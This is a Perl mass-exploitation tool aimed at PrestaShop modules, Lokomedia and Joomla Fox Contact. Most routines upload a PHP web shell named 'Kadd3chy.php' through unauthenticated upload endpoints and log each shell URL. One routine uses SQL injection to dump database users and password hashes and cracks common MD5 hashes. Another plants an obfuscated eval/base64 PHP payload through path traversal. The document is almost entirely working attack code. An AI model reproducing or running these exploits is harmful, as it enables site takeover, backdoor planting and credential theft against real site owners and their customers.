sub simpleslideshow(){
my $url = "$site/modules/simpleslideshow/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["Kadd3chy.php"],]);

$simpleslideshowup="$site/modules/simpleslideshow/slides/Kadd3chy.php";

my $checksimpleslideshow = $ua->get("$simpleslideshowup")->content;
if($checksimpleslideshow =~/Kadd3chy/) {
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";

print color('bold white'),"simpleslideshow";
print color('bold white')," Exploiting .. ";
print color('bold green'),"Vulnerable\n";
print color('bold white'),"Done Shell Uploaded\n";
print color('bold white'),"  Shell Link => $simpleslideshowup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$simpleslideshowup\n";
close (TEXT);
}else{
print color('bold white'),"simpleslideshow";
print color('bold white')," Exploiting .. ";
print color('bold red'),"Not Vulnerable\n";
}
}	

################ productpageadverts #####################
sub productpageadverts(){
my $url = "$site/modules/productpageadverts/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["Kadd3chy.php"],]);

$productpageadvertsup="$site/modules/productpageadverts/slides/Kadd3chy.php";

my $checkproductpageadverts = $ua->get("$productpageadvertsup")->content;
if($checkproductpageadverts =~/Kadd3chy/) {
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";

print color('bold white'),"productpageadverts";
print color('bold white')," ................ ";
print color('bold green'),"Vulnerable\n";
print color('bold white'),"	n";
print color('bold white'),"  Shell Link => $productpageadvertsup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$productpageadvertsup\n";
close (TEXT);
}else{
print color('bold white'),"productpageadverts";
print color('bold white')," ................ ";
print color('bold red'),"Not Vulnerable\n";
}
}

################ homepageadvertise #####################
sub homepageadvertise(){
my $url = "$site/modules/homepageadvertise/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["Kadd3chy.php"],]);
$homepageadvertiseup="$site/modules/homepageadvertise/slides/Kadd3chy.php";

my $checkhomepageadvertise = $ua->get("$homepageadvertiseup")->content;
if($checkhomepageadvertise =~/Kadd3chy/) {
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";

print color('bold white'),"homepageadvertise";
print color('bold white')," ................. ";
print color('bold green'),"Vulnerable\n";
print color('bold white'),"Done Shell Uploaded\n";
print color('bold white'),"  Shell Link => $homepageadvertiseup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$homepageadvertiseup\n";
close (TEXT);
}else{
print color('bold white'),"homepageadvertise";
print color('bold white')," ................. ";
print color('bold red'),"Not Vulnerable\n";
}
}

################ homepageadvertise2 #####################
sub homepageadvertise2(){
my $url = "$site/modules/homepageadvertise2/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["Kadd3chy.php"],]);

$homepageadvertise2up="$site/modules/homepageadvertise2/slides/Kadd3chy.php";

my $checkhomepageadvertise2 = $ua->get("$homepageadvertise2up")->content;
if($checkhomepageadvertise2 =~/Kadd3chy/) {
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";

print color('bold white'),"homepageadvertise2";
print color('bold white')," ................ ";
print color('bold green'),"Vulnerable\n";
print color('bold white'),"Done Shell Uploaded\n";
print color('bold white'),"  Shell Link => $homepageadvertise2up\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$homepageadvertise2up\n";
close (TEXT);
}else{
print color('bold white'),"homepageadvertise2";
print color('bold white')," ................ ";
print color('bold red'),"Not Vulnerable\n";
}
}

################ jro_homepageadvertise #####################
sub jro_homepageadvertise(){
my $url = "$site/modules/jro_homepageadvertise/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["Kadd3chy.php"],]);

$jro_homepageadvertiseup="$site/modules/jro_homepageadvertise/slides/Kadd3chy.php";

my $checkjro_homepageadvertise = $ua->get("$jro_homepageadvertiseup")->content;
if($checkjro_homepageadvertise =~/Kadd3chy/) {
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";

print color('bold white'),"jro_homepageadvertise";
print color('bold white')," Exploiting .. ";
print color('bold green'),"Vulnerable\n";
print color('bold white'),"Done Shell Uploaded\n";
print color('bold white'),"  Shell Link => $jro_homepageadvertiseup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$jro_homepageadvertiseup\n";
close (TEXT);
}else{
print color('bold white'),"jro_homepageadvertise";
print color('bold white')," Exploiting .. ";
print color('bold red'),"Not Vulnerable\n";
}
}

################ attributewizardpro #####################
sub attributewizardpro(){
my $url = "$site/modules/attributewizardpro/file_upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["Kadd3chy.php"],]);

$attributewizardproup="$site/modules/attributewizardpro/file_uploads/Kadd3chy.php";

my $checkattributewizardpro = $ua->get("$attributewizardproup")->content;
if($checkattributewizardpro =~/Kadd3chy/) {
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";

print color('bold white'),"attributewizardpro";
print color('bold white')," ................ ";
print color('bold green'),"Vulnerable\n";
print color('bold white'),"Done Shell Uploaded\n";
print color('bold white'),"  Shell Link => $attributewizardproup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$attributewizardproup\n";
close (TEXT);
}else{
print color('bold white'),"attributewizardpro";
print color('bold white')," ................ ";
print color('bold red'),"Not Vulnerable\n";
}
}

################ 1attributewizardpro #####################
sub oneattributewizardpro(){
my $url = "$site/modules/1attributewizardpro/file_upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["Kadd3chy.php"],]);

$oneattributewizardproup="$site/modules/1attributewizardpro/file_uploads/Kadd3chy.php";

my $checkoneattributewizardpro = $ua->get("$oneattributewizardproup")->content;
if($checkoneattributewizardpro =~/Kadd3chy/) {
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";

print color('bold white'),"1attributewizardpro";
print color('bold white')," Exploiting .. ";
print color('bold green'),"Vulnerable\n";
print color('bold white'),"Done Shell Uploaded\n";
print color('bold white'),"  Shell Link => $oneattributewizardproup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$oneattributewizardproup\n";
close (TEXT);
}else{
print color('bold white'),"1attributewizardpro";
print color('bold white')," Exploiting .. ";
print color('bold red'),"Not Vulnerable\n";
}
}

################ attributewizardpro.OLD #####################
sub attributewizardproOLD(){
my $url = "$site/modules/attributewizardpro.OLD/file_upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["Kadd3chy.php"],]);

$attributewizardproOLDup="$site/modules/attributewizardpro.OLD/file_uploads/Kadd3chy.php";

my $checkattributewizardproOLD = $ua->get("$attributewizardproOLDup")->content;
if($checkattributewizardproOLD =~/Kadd3chy/) {
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Attributewizardpro.OLD";
print color('bold white')," ............ ";
print color('bold green'),"Vulnerable\n";
print color('bold white'),"Done Shell Uploaded\n";
print color('bold white'),"  Shell Link => $attributewizardproOLDup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$attributewizardproOLDup\n";
close (TEXT);
}else{
print color('bold white'),"Attributewizardpro.OLD";
print color('bold white')," ............ ";
print color('bold red'),"Not Vulnerable\n";
}
}


################ attributewizardpro_x #####################
sub attributewizardpro_x(){
my $url = "$site/modules/attributewizardpro_x/file_upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["Kadd3chy.php"],]);

$attributewizardpro_xup="$site/modules/attributewizardpro_x/file_uploads/Kadd3chy.php";

my $checkattributewizardpro_x = $ua->get("$attributewizardpro_xup")->content;
if($checkattributewizardpro_x =~/Kadd3chy/) {
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";

print color('bold white'),"attributewizardpro_x";
print color('bold white')," Exploiting .. ";
print color('bold green'),"Vulnerable\n";
print color('bold white'),"Done Shell Uploaded\n";
print color('bold white'),"  Shell Link => $attributewizardpro_xup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$attributewizardpro_xup\n";
close (TEXT);
}else{
print color('bold white'),"attributewizardpro_x";
print color('bold white')," Exploiting .. ";
print color('bold red'),"Not Vulnerable\n";
}
}

################ advancedslider #####################
sub advancedslider(){
my $url = "$site/modules/advancedslider/ajax_advancedsliderUpload.php?action=submitUploadImage%26id_slide=php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [qqfile => ["Kadd3chy.php.png"],]);

$advancedsliderup="$site/modules/advancedslider/uploads/Kadd3chy.php.png";

my $checkadvancedslider = $ua->get("$advancedsliderup")->content;
if($checkadvancedslider =~/Kadd3chy/) {
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";

print color('bold white'),"advancedslider";
print color('bold white')," Exploiting ... ";
print color('bold green'),"Vulnerable\n";
print color('bold white'),"Done Shell Uploaded\n";
print color('bold white'),"  Shell Link => $advancedsliderup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$advancedsliderup\n";
close (TEXT);
}else{
print color('bold white'),"advancedslider";
print color('bold white')," Exploiting ... ";
print color('bold red'),"Not Vulnerable\n";
}
}

################ cartabandonmentpro #####################
sub cartabandonmentpro(){
my $url = "$site/modules/cartabandonmentpro/upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [image => ["Kadd3chy.php.png"],]);

$cartabandonmentproup="$site/modules/cartabandonmentpro/uploads/Kadd3chy.php.png";
my $checkcartabandonmentpro = $ua->get("$cartabandonmentproup")->content;
if($checkcartabandonmentpro =~/Kadd3chy/) {
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";

print color('bold white'),"cartabandonmentpro";
print color('bold white')," ................ ";
print color('bold green'),"Vulnerable\n";
print color('bold white'),"Done Shell Uploaded\n";
print color('bold white'),"  Shell Link => $cartabandonmentproup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$cartabandonmentproup\n";
close (TEXT);
}else{
print color('bold white'),"cartabandonmentpro";
print color('bold white')," ................ ";
print color('bold red'),"Not Vulnerable\n";
}
}

################ cartabandonmentproOld #####################
sub cartabandonmentproOld(){
my $url = "$site/modules/cartabandonmentproOld/upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [image => ["Kadd3chy.php.png"],]);

$cartabandonmentproOldup="$site/modules/cartabandonmentproOld/uploads/Kadd3chy.php.png";

my $checkcartabandonmentproOld = $ua->get("$cartabandonmentproOldup")->content;
if($checkcartabandonmentproOld =~/Kadd3chy/) {
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";

print color('bold white'),"cartabandonmentproOld";
print color('bold white')," Exploiting .. ";
print color('bold green'),"Vulnerable\n";
print color('bold white'),"Done Shell Uploaded\n";
print color('bold white'),"  Shell Link => $cartabandonmentproOldup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$cartabandonmentproOldup\n";
close (TEXT);
}else{
print color('bold white'),"cartabandonmentproOld";
print color('bold white')," Exploiting .. ";
print color('bold red'),"Not Vulnerable\n";
}
}

################ videostab #####################
sub videostab(){
my $url = "$site/modules/videostab/ajax_videostab.php?action=submitUploadVideo%26id_product=upload";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [qqfile => ["Kadd3chy.php.mp4"],]);

$videostabup="$site/modules/videostab/uploads/Kadd3chy.php.mp4";
my $checkvideostab = $ua->get("$videostabup")->content;
if($checkvideostab =~/Kadd3chy/) {
print color('bold white'),"videostab";
print color('bold white')," Exploiting .. ";
print color('bold green'),"Vulnerable\n";
print color('bold white'),"Done Shell Uploaded\n";
print color('bold white'),"  Shell Link => $videostabup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$videostabup\n";
close (TEXT);
}else{
print color('bold white'),"videostab";
print color('bold white')," Exploiting .. ";
print color('bold red'),"Not Vulnerable\n";
}
}

################ wg24themeadministration #####################
sub wg24themeadministration(){
my $url = "$site/modules//wg24themeadministration/wg24_ajax.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', data => 'bajatax', type => 'pattern_upload', Content => [bajatax => ["Kadd3chy.php"],]);

$wg24themeadministrationup="$site/modules//wg24themeadministration///img/upload/Kadd3chy.php";

my $checkwg24themeadministration = $ua->get("$wg24themeadministrationup")->content;
if($checkwg24themeadministration =~/Kadd3chy/) {
print color('bold white'),"wg24themeadministration";
print color('bold white')," ........... ";
print color('bold green'),"Vulnerable\n";
print color('bold white'),"Done Shell Uploaded\n";
print color('bold white'),"  Shell Link => $wg24themeadministrationup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$wg24themeadministrationup\n";
close (TEXT);
}else{
print color('bold white'),"wg24themeadministration";
print color('bold white')," ........... ";
print color('bold red'),"Not Vulnerable\n";
}
}

################ fieldvmegamenu #####################
sub fieldvmegamenu(){
my $url = "$site/modules/fieldvmegamenu/ajax/upload.php";
my $shell ="Kadd3chy.php";
my $field_name = "images[]";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$shell"] ]
           
            );
$fieldvmegamenuup="$site/modules/fieldvmegamenu/uploads/Kadd3chy.php";

my $checkfieldvmegamenu = $ua->get("$fieldvmegamenuup")->content;
if($checkfieldvmegamenu =~/Kadd3chy/) {
print color('bold white'),"fieldvmegamenu";
print color('bold white')," Exploiting ... ";
print color('bold green'),"Vulnerable\n";
print color('bold white'),"Done Shell Uploaded\n";
print color('bold white'),"  Shell Link => $fieldvmegamenuup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$fieldvmegamenuup\n";
close (TEXT);
}else{
print color('bold white'),"fieldvmegamenu";
print color('bold white')," Exploiting ... ";
print color('bold red'),"Not Vulnerable\n";
}
}


################ wdoptionpanel #####################
sub wdoptionpanel(){
my $url = "$site/modules/wdoptionpanel/wdoptionpanel_ajax.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', data => 'bajatax', type => 'image_upload', Content => [bajatax => ["Kadd3chy.php"],]);

$wdoptionpanelup="$site/modules/wdoptionpanel/upload/Kadd3chy.php";

my $checkwdoptionpanel = $ua->get("$wdoptionpanelup")->content;
if($checkwdoptionpanel =~/Kadd3chy/) {
print color('bold white'),"wdoptionpanel";
print color('bold white')," Exploiting .. ";
print color('bold green'),"Vulnerable\n";
print color('bold white'),"Done Shell Uploaded\n";
print color('bold white'),"  Shell Link => $wdoptionpanelup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$wdoptionpanelup\n";
close (TEXT);
}else{
print color('bold white'),"wdoptionpanel";
print color('bold white')," Exploiting .. ";
print color('bold red'),"Not Vulnerable\n";
}
}


################ pk_flexmenu #####################
sub pk_flexmenu(){
my $url = "$site/modules/pk_flexmenu/ajax/upload.php";
my $shell ="Kadd3chy.php";
my $field_name = "images[]";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$shell"] ]
           
            );
$pk_flexmenuup="$site/modules/pk_flexmenu/uploads/Kadd3chy.php";

my $checkpk_flexmenu = $ua->get("$pk_flexmenuup")->content;
if($checkpk_flexmenu =~/Kadd3chy/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"pk_flexmenu";
print color('bold white')," Exploiting ...... ";
print color('bold green'),"Vulnerable\n";
print color('bold white'),"Done Shell Uploaded\n";
print color('bold white'),"  Shell Link => $pk_flexmenuup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$pk_flexmenuup\n";
close (TEXT);
}else{
print color('bold white'),"pk_flexmenu";
print color('bold white')," Exploiting ...... ";
print color('bold red'),"Not Vulnerable\n";
}
}

################ pk_vertflexmenu #####################
sub pk_vertflexmenu(){
my $url = "$site/modules/pk_vertflexmenu/ajax/upload.php";
my $shell ="Kadd3chy.php";
my $field_name = "images[]";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$shell"] ]
           
            );
$pk_vertflexmenuup="$site/modules/pk_vertflexmenu/uploads/Kadd3chy.php";
my $checkpk_vertflexmenu = $ua->get("$pk_vertflexmenuup")->content;
if($checkpk_vertflexmenu =~/Kadd3chy/) {
print color('bold white'),"pk_vertflexmenu";
print color('bold white')," Exploiting .. ";
print color('bold green'),"Vulnerable\n";
print color('bold white'),"Done Shell Uploaded\n";
print color('bold white'),"  Shell Link => $pk_vertflexmenuup\n";

open (TEXT, '>>Result/Shells.txt');
print TEXT "$pk_vertflexmenuup\n";
close (TEXT);
}else{
print color('bold white'),"pk_vertflexmenu";
print color('bold white')," Exploiting .. ";
print color('bold red'),"Not Vulnerable\n";
}
}

################ nvn_export_orders #####################
sub nvn_export_orders(){
my $url = "$site/modules/nvn_export_orders/upload.php";
my $shell ="nvn_extra_add.php";
my $field_name = "images[]";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$shell"] ]
           
            );
$nvn_export_ordersup="$site/modules/nvn_export_orders/nvn_extra_add.php";

my $checknvn_export_orders = $ua->get("$nvn_export_ordersup")->content;
if($checknvn_export_orders =~/Kadd3chy/) {
print color('bold white'),"nvn_export_orders";
print color('bold white')," ................. ";
print color('bold green'),"Vulnerable\n";
print color('bold white'),"Done Shell Uploaded\n";
print color('bold white'),"  Shell Link => $nvn_export_ordersup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$nvn_export_ordersup\n";
close (TEXT);
}else{
print color('bold white'),"nvn_export_orders";
print color('bold white')," ................. ";
print color('bold red'),"Not Vulnerable\n";
}
}

################ megamenu #####################
sub megamenu(){
my $url = "$site/modules/megamenu/uploadify/uploadify.php?id=Kadd3chy.php";
my $shell ="Kadd3chy.php.png";
my $field_name = "Filedata";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$shell"] ]
           
            );
$megamenuup="$site/Kadd3chy.php.png";

my $checkmegamenu = $ua->get("$megamenuup")->content;
if($checkmegamenu =~/Kadd3chy/) {
print color('bold white'),"megamenu";
print color('bold white')," Exploiting ......... ";
print color('bold green'),"Vulnerable\n";
print color('bold white'),"Done Shell Uploaded\n";
print color('bold white'),"  Shell Link => $megamenuup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$megamenuup\n";
close (TEXT);
}else{
print color('bold white'),"megamenu";
print color('bold white')," Exploiting ......... ";
print color('bold red'),"Not Vulnerable\n";
}
}

################ tdpsthemeoptionpanel #####################
sub tdpsthemeoptionpanel(){
my $url = "$site/modules/tdpsthemeoptionpanel/tdpsthemeoptionpanelAjax.php";
my $shell ="Kadd3chy.php";
my $field_name = "image_upload";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            data => 'bajatax',
            Content => [ $field_name => ["$shell"] ]
           
            );
$tdpsthemeoptionpanelup="$site/modules/tdpsthemeoptionpanel/upload/Kadd3chy.php";

my $checktdpsthemeoptionpanel = $ua->get("$tdpsthemeoptionpanelup")->content;
if($checktdpsthemeoptionpanel =~/Kadd3chy/) {
print color('bold white'),"tdpsthemeoptionpanel";
print color('bold white')," Exploiting .. ";
print color('bold green'),"Vulnerable\n";
print color('bold white'),"Done Shell Uploaded\n";
print color('bold white'),"  Shell Link => $tdpsthemeoptionpanelup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$tdpsthemeoptionpanelup\n";
close (TEXT);
}else{
print color('bold white'),"tdpsthemeoptionpanel";
print color('bold white')," Exploiting .. ";
print color('bold red'),"Not Vulnerable\n";
}
}


################ psmodthemeoptionpanel #####################
sub psmodthemeoptionpanel(){
my $url = "$site/modules/psmodthemeoptionpanel/psmodthemeoptionpanel_ajax.php";
my $shell ="Kadd3chy.php";
my $field_name = "image_upload";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            data => 'bajatax',
            Content => [ $field_name => ["$shell"] ]
           
            );
$psmodthemeoptionpanelup="$site/modules/psmodthemeoptionpanel/upload/Kadd3chy.php";

my $checkpsmodthemeoptionpanel = $ua->get("$psmodthemeoptionpanelup")->content;
if($checkpsmodthemeoptionpanel =~/Kadd3chy/) {
print color('bold white'),"psmodthemeoptionpanel";
print color('bold white')," Exploiting .. ";
print color('bold green'),"Vulnerable\n";
print color('bold white'),"Done Shell Uploaded\n";
print color('bold white'),"  Shell Link => $psmodthemeoptionpanelup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$psmodthemeoptionpanelup\n";
close (TEXT);
}else{
print color('bold white'),"psmodthemeoptionpanel";
print color('bold white')," Exploiting .. ";
print color('bold red'),"Not Vulnerable\n";
}
}


################ masseditproduct #####################
sub masseditproduct(){
my $url = "$site/modules/lib/redactor/file_upload.php";
my $shell ="Kadd3chy.php";
my $field_name = "file";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$shell"] ]
           
            );
$masseditproductup="$site/masseditproduct/uploads/file/Kadd3chy.php";

my $checkmasseditproduct = $ua->get("$masseditproductup")->content;
if($checkmasseditproduct =~/Kadd3chy/) {

print color('bold white'),"masseditproduct";
print color('bold white')," Exploiting .. ";
print color('bold green'),"Vulnerable\n";
print color('bold white'),"Done Shell Uploaded\n";
print color('bold white'),"  Shell Link => $masseditproductup\n\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$masseditproductup\n";
close (TEXT);
}else{
print color('bold white'),"masseditproduct";
print color('bold white')," Exploiting .. ";
print color('bold red'),"Not Vulnerable\n\n";
}
}


################ lokomedia #####################
sub lokomedia(){
$lokoversion = "$site/statis--7'union select /*!50000Concat*/(Version())+from+users--+--+kantordesa.html";
$lokodatabase = "$site/statis--7'union select /*!50000Concat*/(Database())+from+users--+--+kantordesa.html";
$lokouserdata = "$site/statis--7'union select /*!50000Concat*/(USER())+from+users--+--+kantordesa.html";
$lokouser = "$site/statis--7'union select /*!50000Concat*/(username)+from+users--+--+kantordesa.html";
$lokopass = "$site/statis--7'union select /*!50000Concat*/(password)+from+users--+--+kantordesa.html";

my $checklokoversion = $ua->get("$lokoversion")->content;
if($checklokoversion =~/<meta name="description" content="(.*)">/) {
$dbv=$1;

if($dbv =~ /[a-z]/){
print color('bold white')," MySQL Version : $dbv\n";
open (TEXT, '>>Result/DataBases.txt');
print TEXT "\n[ DATABASE ]\n";
print TEXT "$site";
print TEXT "\nMySQL Version : $dbv";
close (TEXT);
my $checklokodatabase = $ua->get("$lokodatabase")->content;
if($checklokodatabase =~/<meta name="description" content="(.*)">/) {
$db=$1;
print color('bold white')," Current Database : $db\n";
open (TEXT, '>>Result/DataBases.txt');
print TEXT "\nCurrent Database : $db";
close (TEXT);
}
my $checklokouserdata = $ua->get("$lokouserdata")->content;
if($checklokouserdata =~/<meta name="description" content="(.*)">/) {
$udb=$1;
print color('bold white')," Current Username : $udb\n";
}
my $checklokouser = $ua->get("$lokouser")->content;
if($checklokouser =~/<meta name="description" content="(.*)">/) {
$user=$1;
print color('bold white')," Username : $user\n";
open (TEXT, '>>Result/DataBases.txt');
print TEXT "\nUsername : $user";
close (TEXT);
}
my $checklokopass = $ua->get("$lokopass")->content;
if($checklokopass =~/<meta name="description" content="(.*)">/) {
$hash=$1;
print color('bold white')," Hash Pass : $hash\n";
open (TEXT, '>>Result/DataBases.txt');
print TEXT "\nHash Pass : $hash";
close (TEXT);
lokohash();
lokopanel();
}
}
}
}
sub lokohash(){
if ($hash =~ /a66abb5684c45962d887564f08346e8d/){
print color('bold white'),"Cracking Hash : ";
print color('bold green'),"Founded !";
print color('bold white'),"Password : admin123456\n";
open (TEXT, '>>Result/DataBases.txt');
print TEXT "\nPassword : admin123456";
close (TEXT);
}
elsif ($hash =~ /0192023a7bbd73250516f069df18b500/){
print color('bold white'),"Cracking Hash : ";
print color('bold green'),"Founded !";
print color('bold white'),"Password : admin123\n";
open (TEXT, '>>Result/DataBases.txt');
print TEXT "\nPassword : admin123";
close (TEXT);
}
elsif ($hash =~ /73acd9a5972130b75066c82595a1fae3/){
print color('bold white'),"Cracking Hash : ";
print color('bold green'),"Founded !";
print color('bold white'),"Password : ADMIN\n";
open (TEXT, '>>Result/DataBases.txt');
print TEXT "\nPassword : ADMIN";
close (TEXT);
}
elsif ($hash =~ /7b7bc2512ee1fedcd76bdc68926d4f7b/){
print color('bold white'),"Cracking Hash : ";
print color('bold green'),"Founded !";
print color('bold white'),"Password : Administrator\n";
open (TEXT, '>>Result/DataBases.txt');
print TEXT "\nPassword : Administrator";
close (TEXT);
}
elsif ($hash =~ /c21f969b5f03d33d43e04f8f136e7682/){
print color('bold white'),"Cracking Hash : ";
print color('bold green'),"Founded !";
print color('bold white'),"Password : default\n";
open (TEXT, '>>Result/DataBases.txt');
print TEXT "\nPassword : default";
close (TEXT);
}
elsif ($hash =~ /1a1dc91c907325c69271ddf0c944bc72/){
print color('bold white'),"Cracking Hash : ";
print color('bold green'),"Founded !";
print color('bold white'),"Password : pass\n";
open (TEXT, '>>Result/DataBases.txt');
print TEXT "\nPassword : pass";
close (TEXT);
}
elsif ($hash =~ /5f4dcc3b5aa765d61d8327deb882cf99/){
print color('bold white'),"Cracking Hash : ";
print color('bold green'),"Founded !";
print color('bold white'),"Password : password\n";
open (TEXT, '>>Result/DataBases.txt');
print TEXT "\nPassword : password";
close (TEXT);
}
elsif ($hash =~ /098f6bcd4621d373cade4e832627b4f6/){
print color('bold white'),"Cracking Hash : ";
print color('bold green'),"Founded !";
print color('bold white'),"Password : test\n";
open (TEXT, '>>Result/DataBases.txt');
print TEXT "\nPassword : test";
close (TEXT);
}
elsif ($hash =~ /21232f297a57a5a743894a0e4a801fc3/){
print color('bold white'),"Cracking Hash : ";
print color('bold green'),"Founded !";
print color('bold white'),"Password : admin\n";
open (TEXT, '>>Result/DataBases.txt');
print TEXT "\nPassword : admin";
close (TEXT);
}
elsif ($hash =~ /fe01ce2a7fbac8fafaed7c982a04e229/){
print color('bold white'),"Cracking Hash : ";
print color('bold green'),"Found!\n";
print color('bold white'),"Password : demo\n";
open (TEXT, '>>Result/DataBases.txt');
print TEXT "\nPassword : demo";
close (TEXT);
}
else{
print color('bold white'),"Password : ";
print color('bold red'),"Not Founded\n";
}
}

sub lokopanel(){
$ua = LWP::UserAgent->new();
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout(15);
$pathone = "$site/redaktur";
my $lokomediacms = $ua->get("$pathone")->content;
if($lokomediapathone =~/administrator|username|password/) {
print color('bold white'),"Admin Panel : ";
print color('bold green'),"Found!\n";
print color('bold white'),"URL : $pathone\n\n";
open (TEXT, '>>Result/DataBases.txt');
print TEXT "\nURL : $pathone";
close (TEXT);
}
else{
print color('bold white'),"Admin Panel : ";
print color('bold red'),"Not Founded\n\n";
}
}






#       _                           _       ______            
#      | |                         | |     |  ____|           
# | | ___  _ __ ___  _ __ ___ | | __ _| |__  __  ___ __  
#  _   | |/ _ \| '_ ` _ \| '_ ` _ \| |/ _` |  __| \ \/ / '_ \ 
# | |__| | (_) | | | | | | | | | | | | (_| | |____ >  <| |_) |
#  \____/ \___/|_| |_| |_|_| |_| |_|_|\__,_|______/_/\_\ .__/ 
#                                                      | |    
#
################ foxcontact #####################

################ Version #####################
sub versionn(){

my $url = "$site/language/en-GB/en-GB.xml";
my $checkomusersc = $ua->get("$url")->content;

if($checkomusersc =~/<version>(.*)</) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Joomla Version";
print color('bold white')," Exploiting ... ";
print color('bold white'),"";
print color('bold green'),"$1";
print color('bold white'),"\n";

open (TEXT, '>>Result/Version.txt');
print TEXT "joom => $site => $1\n";
close (TEXT);
}
}

sub fox2(){

my @filesz = ('/kontakty','kontakty.html','contatti.html','/index.php/kontakty','/contact','contacto','/index.php/contato.html','en/contact','contactenos');
OUTER: foreach $vulz(@filesz){
my $url = "$site/$vulz";
print colored (" Scanning Fox_Contact ",'white on_blue'),$url."\n";
my $checkfoxupx = $ua->get("$url")->content;
if ($checkfoxupx =~ /foxcontact/) {	
	my $regex='<a name="cid_(.*?)">';
    if($checkfoxupx =~ s/$regex//){
		my $regex='<a name="mid_(.*?)">';
    if($checkfoxupx =~ s/$regex//){
}
my @files = ('components/com_foxcontact/lib/file-uploader.php?cid='.$1.'&mid='.$1.'&qqfile=/../../Kadd3chy.php','index.php?option=com_foxcontact&view=loader&type=uploader&owner=component&id='.$1.'?cid='.$1.'&mid='.$1.'&qqfile=/../../Kadd3chy.php','index.php?option=com_foxcontact&amp;view=loader&amp;type=uploader&amp;owner=module&amp;id='.$1.'&cid='.$1.'&mid='.$1.'&owner=module&id='.$1.'&qqfile=/../../Kadd3chy.php','components/com_foxcontact/lib/uploader.php?cid='.$1.'&mid='.$1.'&qqfile=/../../Kadd3chy.php');
OUTER: foreach my $vul(@files){
chomp $vul;
 my $izo = $site . $vul; 
my $indexa='<h5>Uploder Kadd3chy</h5>
<?php eval (gzinflate(base64_decode(str_rot13("ML/EF8ZjRZnsUrk/hVMOJaQZS19pZ3kkVNtX06qEFgnxAct0bH2RGin/zljgT/c2q9
/iih+BI40TaSguWq98TXxc4k0pOiufqT+K7WvibboK8kxCfTyZ6IddrWcAV5mKhyANXlg0FkNPkJ2wTHUTrlQtoJHUjjyFGycunTqKtI8lnvzPLRJ
DT6ZEPUoIKJWkYyewYRFaJxt+epn6S0qs39+umDuTfsEJnSmd3HRWTkCv/WgX54K4g98833KBSUHXv/Ygqsr+k4USOENPRjxM/ZkaAk56eYDM0xJ5
sK552h1khNHKr2lIXpZOhYvSs2VHZh8O8oKbPibYUutxFLYKpCY2KCo8Y7ByDy6D0l8=")))); ?>';
